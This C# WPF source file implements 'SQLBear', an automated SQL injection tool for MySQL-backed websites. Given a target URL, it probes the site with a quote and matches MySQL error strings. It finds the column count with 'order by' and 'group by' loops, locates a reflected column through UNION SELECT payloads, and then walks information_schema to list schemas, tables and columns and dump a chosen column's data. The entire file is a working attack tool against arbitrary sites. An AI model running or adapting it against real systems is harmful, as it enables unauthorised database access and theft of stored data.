using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.ComponentModel;

namespace SQLBear
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {

        private string[] args = null;
        private string specialStr = "843d2252a0ebb5372d37a1b2f7d5b655"; // MD5 hash of sqlbear
        private string originalPage = null;
        private string url = null;
        private int colNum = 0;
        private int vulCol = 0;
        private string schemaName = null;
        private string tableName = null;
        private string columnName = null;
        private bool dump = false;
        public Brush bearBrush;
        private string[] ErrorMsgs = {
            "You have an error in your SQL",
            "' in 'order clause'",
            "' in 'group statement'",
            "mysql_numrows() expects parameter ",
            "mysql_fetch_array() expects parameter ",
            "mysql_num_rows() expects parameter ",
            "' at line 1"
        };

        public MainWindow()
        {
            InitializeComponent();
            LogBox.AppendText("Welcome to SQLBear!\nType in a website link and press enter to start.");
            UrlBox.Focus();
            UrlBox.Text = @"http://www.example.com/some_page.php?id=1";
        }

        private void Border_MouseDown(object sender, MouseButtonEventArgs e)
        {
            if (e.ChangedButton == MouseButton.Left)
                this.DragMove();
        }

        private void UrlBox_KeyUp(object sender, KeyEventArgs e)
        {
            if (e.Key == Key.Return)
            {
                UrlBox.IsEnabled = false;
                Random rand = new Random();
                specialStr = rand.Next() + "";
                bearBrush = BearBtn.Foreground;
                BearBtn.Foreground = SystemColors.HighlightBrush;
                args = UrlBox.Text.Split(' ');
                try
                {
                    url = args[0];
                    colNum = Int32.Parse(args[1]);
                    vulCol = Int32.Parse(args[2]);
                    schemaName = args[3];
                    tableName = args[4];
                    columnName = args[5];
                }
                catch (Exception)
                { /*Do nothing*/ }
                BackgroundWorker bgw = new BackgroundWorker();
                if (columnName != null)
                    bgw.DoWork += ColumnDump;
                else if (tableName != null)
                    bgw.DoWork += ColumnsSearch;
                else if (schemaName != null)
                    bgw.DoWork += TablesSearch;
                else if (vulCol > 0)
                    bgw.DoWork += SchemaSearch;
                else
                    bgw.DoWork += VulnerabilityTest;
                bgw.WorkerReportsProgress = true;
                bgw.RunWorkerCompleted += bgw_RunWorkerCompleted;
                bgw.RunWorkerAsync();
            }
        }

        void bgw_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
        {
            this.Dispatcher.Invoke(() =>
            {
                UrlBox.IsEnabled = true;
                UrlBox.Focus();
                BearBtn.Foreground = bearBrush;
            });
            url = null;
            colNum = 0;
            vulCol = 0;
            schemaName = null;
            tableName = null;
            columnName = null;
            dump = false;
            Logger("\n" + makeHeader("End of SQLBear!") + "\n");
        }

        private void Logger(string log)
        {
            this.Dispatcher.Invoke(() =>
            {
                LogBox.AppendText("\n" + log);
                LogScroll.ScrollToBottom();
            });
        }

        private string makeHeader(string title)
        {
            string header = "";
            int n = (97 - title.Length + 1) / 2;
            for (int i = 0; i < n; i++)
                header += "-";
            if (title.Length % 2 == 0)
                title = " " + title;
            header += "[ " + title + " ]";
            for (int i = 0; i < n; i++)
                header += "-";
            return header;
        }

        private bool errorCheck(string text)
        {
            foreach (string msg in ErrorMsgs)
            {
                if (text.IndexOf(msg) > -1)
                    return true;
            }
            return false;
        }

        private string str2hex(string text)
        {
            byte[] ba = Encoding.Default.GetBytes(text);
            var hexString = BitConverter.ToString(ba);
            hexString = hexString.Replace("-", "");
            return "0x" + hexString;
        }

        private string findData(string original, string html)
        {
            for (int i = 0; i < html.Length; i++)
            {
                if (html[i] != original[i])
                {
                    string tmp = html.Substring(i);
                    try
                    {
                        return tmp.Substring(0, tmp.IndexOf('<')).Trim();
                    }
                    catch (Exception)
                    {
                        return null;
                    }
                }
            }
            return null;
        }

        private string specialFindData(string html)
        {
            if (html.IndexOf(specialStr) > -1)
            {
                string tmp = html.Substring(html.IndexOf(specialStr) + specialStr.Length);
                return tmp.Substring(0, tmp.IndexOf(specialStr)).Trim();
            }
            return null;
        }

        private string creatQuery(string starts, int cols, int ill, string illRep, string ends)
        {
            for (int i = 1; i <= cols; i++)
            {
                if (i != 1)
                    starts += ",";
                if (i == ill)
                    starts += illRep;
                else
                    starts += i;
            }
            return starts += ends;
        }

        void VulnerabilityTest(object sender, DoWorkEventArgs e)
        {
            Logger("\n" + makeHeader("Starting SQLBear!") + "\nUrl: " + url + "\n");
            WebClient client = new WebClient();
            originalPage = client.DownloadString(url);
            Logger("[❗]\tVulnerability test using: " + url + "'");
            string html = client.DownloadString(url + "'");
            if (errorCheck(html))
                Logger("[✔]\tResult: Vulnerable");
            else
            {
                Logger("[✖]\tResult: Not vulnerable");
                this.EndInit();
            }
            for (int i = 1; i <= 101; i++)
            {
                html = client.DownloadString(url + " order by " + i + "--");
                Logger("[❗]\tTesting " + url + " order by " + i + "--");
                if (errorCheck(html))
                {
                    colNum = i - 1;
                    break;
                }
            }
            if (colNum == 0)
            {
                Logger("[❗]\tStarting \"group by\" test");
                for (int i = 1; i <= 101; i++)
                {
                    html = client.DownloadString(url + " group by " + i + "--");
                    Logger("[❗]\tTesting " + url + " group by " + i + "--");
                    if (errorCheck(html))
                    {
                        colNum = i - 1;
                        break;
                    }
                }
                if (colNum == 0)
                {
                    Logger("[✖]\tCouldn't find number of columns");
                    this.EndInit();
                }
            }
            Logger("[✔]\tNumber of columns: " + colNum + "\n[❗]\tStarting vulnerable column search");
            string tmp = "";
            for (int i = 1; i < colNum; i++)
            {
                tmp += "concat(" + specialStr + "," + i + "," + specialStr + "),";
            }
            tmp += "concat(" + specialStr + "," + colNum + "," + specialStr + ")--";
            Logger("[❗]\t" + url + " union all select " + tmp);
            html = client.DownloadString(url + " union all select " + tmp);
            try
            {
                //Logger(findData(originalPage, html));
                vulCol = Int32.Parse(specialFindData(html));
            }
            catch (Exception)
            {
                Logger("[✖]\tCouldn't find a vulnerable column");
                this.EndInit();
            }
            if (vulCol > 0)
                Logger("[✔]\tVulnerable column number: " + vulCol);
        }

        void SchemaSearch(object sender, DoWorkEventArgs e)
        {
            Logger("\n" + makeHeader("Starting SQLBear!") + "\nUrl: " + url + "\n");
            WebClient client = new WebClient();
            originalPage = client.DownloadString(url);
            string html = "";
            List<string> schNames = new List<string>();
            //string tmp = creatQuery(url + " union all select ", colNum, vulCol, "concat(" + specialStr + ",group_concat(schema_name)," + specialStr + ")", " from information_schema.schemata--");
            string tmp = creatQuery(url + " union all select ", colNum, vulCol, "concat(" + specialStr + ",schema_name," + specialStr + ")", " from information_schema.schemata LIMIT ");
            Logger("[❗]\tStarting schema search");
            for (int i = 0; i < 100; i++)
            {
                Logger("[❗]\t" + tmp + i + ",1--");
                html = client.DownloadString(tmp + i + ",1--");
                string schName = specialFindData(html);
                if ((schName == null || schName.Length == 0) && i != 0)
                    break;
                if (schName != null && schName.Length != 0)
                    schNames.Add(schName);
            }
            Logger("[✔]\t" + schNames.Count + " schema(s) found:");
            for (int i = 0; i < schNames.Count; i++)
            {
                if (schNames[i].Length > 0)
                    Logger("[*]\t\t" + schNames[i]);
            }
        }

        void TablesSearch(object sender, DoWorkEventArgs e)
        {
            Logger("\n" + makeHeader("Starting SQLBear!") + "\nUrl: " + url + "\n");
            WebClient client = new WebClient();
            originalPage = client.DownloadString(url);
            string html = "";
            List<string> tblNames = new List<string>();
            //string tmp = creatQuery(url + " union all select ", colNum, vulCol, "concat(" + specialStr + ",group_concat(table_name)," + specialStr + ")", " from information_schema.tables t where t.table_schema=" + str2hex(schemaName) + "--");
            string tmp = creatQuery(url + " union all select ", colNum, vulCol, "concat(" + specialStr + ",table_name," + specialStr + ")", " from information_schema.tables t where t.table_schema=" + str2hex(schemaName) + " LIMIT ");
            Logger("[❗]\tStarting table search");
            for (int i = 0; i < 100; i++)
            {
                Logger("[❗]\t" + tmp + i + ",1--");
                html = client.DownloadString(tmp + i + ",1--");
                string tblName = specialFindData(html);
                if ((tblName == null || tblName.Length == 0) && i != 0)
                    break;
                if (tblName != null && tblName.Length != 0)
                    tblNames.Add(tblName);
            }
            Logger("[✔]\t" + tblNames.Count + " table(s) found:");
            for (int i = 0; i < tblNames.Count; i++)
            {
                if (tblNames[i].Length > 0)
                    Logger("[*]\t\t" + tblNames[i]);
            }
        }

        void ColumnsSearch(object sender, DoWorkEventArgs e)
        {
            Logger("\n" + makeHeader("Starting SQLBear!") + "\nUrl: " + url + "\n");
            WebClient client = new WebClient();
            originalPage = client.DownloadString(url);
            string html = "";
            List<string> colNames = new List<string>();
            //string tmp = creatQuery(url + " union all select ", colNum, vulCol, "concat(" + specialStr + ",group_concat(column_name)," + specialStr + ")", " from information_schema.columns t where t.table_schema=" + str2hex(schemaName) + " and t.table_name = " + str2hex(tableName) + "--");
            string tmp = creatQuery(url + " union all select ", colNum, vulCol, "concat(" + specialStr + ",column_name," + specialStr + ")", " from information_schema.columns t where t.table_schema=" + str2hex(schemaName) + " and t.table_name = " + str2hex(tableName) + " LIMIT ");
            Logger("[❗]\tStarting column search for table '" + tableName + "'");
            for (int i = 0; i < 100; i++)
            {
                Logger("[❗]\t" + tmp + i + ",1--");
                html = client.DownloadString(tmp + i + ",1--");
                string colName = specialFindData(html);
                if ((colName == null || colName.Length == 0) && i != 0)
                    break;
                if (colName != null && colName.Length != 0)
                    colNames.Add(colName);
            }
            Logger("[✔]\t" + colNames.Count + " column(s) found:");
            for (int i = 0; i < colNames.Count; i++)
            {
                if (colNames[i].Length > 0)
                    Logger("[*]\t\t" + colNames[i]);
            }
        }

        void ColumnDump(object sender, DoWorkEventArgs e)
        {
            Logger("\n" + makeHeader("Starting SQLBear!") + "\nUrl: " + url + "\n");
            WebClient client = new WebClient();
            originalPage = client.DownloadString(url);
            string html = "";
            List<string> dumpedData = new List<string>();
            string tmp = creatQuery(url + " union all select ", colNum, vulCol, "concat(" + specialStr + "," + columnName + "," + specialStr + ")", " from " + tableName + " LIMIT ");
            Logger("[❗]\tStarting '" + columnName + "' dump for table '" + tableName + "'");
            for (int i = 0; i < 100; i++)
            {
                Logger("[❗]\t" + tmp + i + ",1--");
                html = client.DownloadString(tmp + i + ",1--");
                string data = specialFindData(html);
                if ((data == null || data.Length == 0) && i != 0)
                    break;
                if (data != null && data.Length != 0)
                    dumpedData.Add(data);
            }
            Logger("[✔]\t" + dumpedData.Count + " data(s) found:");
            dumpedData.ForEach(delegate(string name)
            {
                Logger("[*]\t\t" + name);
            });
        }
    }
}
